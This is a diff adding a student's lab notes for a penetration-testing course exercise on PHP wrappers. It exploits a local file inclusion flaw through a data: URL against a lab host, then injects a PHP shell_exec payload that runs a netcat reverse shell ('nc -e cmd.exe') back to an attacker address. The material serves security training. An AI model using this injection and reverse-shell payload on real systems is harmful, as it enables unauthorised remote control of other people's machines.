@@ -80,3 +80,15 @@ _(To be performed on your own Kali and Windows 10 lab client machines - Reportin
 3.  Use one of the webshells i
 
 
+# 9.8.10 PHP wrappers
+## Practice - PHP Wrappers
+
+_(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)_
+
+1.  Exploit the LFI vulnerability using a PHP wrapper.
+We simply append the php wrapper `file=data:text/plain,hello world` to the end of our url:
+`http://192.168.231.10/menu.php?file=data:text/plain,hello%20world`
+
+2.  Use a PHP wrapper to get a shell on your Windows 10 lab machine.
+For this we replace the "hello world" at the end of our previous URL with a php script designed to execute code, we also place a reverse shell as our payload for the shell_exec to execute.
+`<?php echo shell_exec("nc -e cmd.exe 192.168.119.231 9001") ?>`
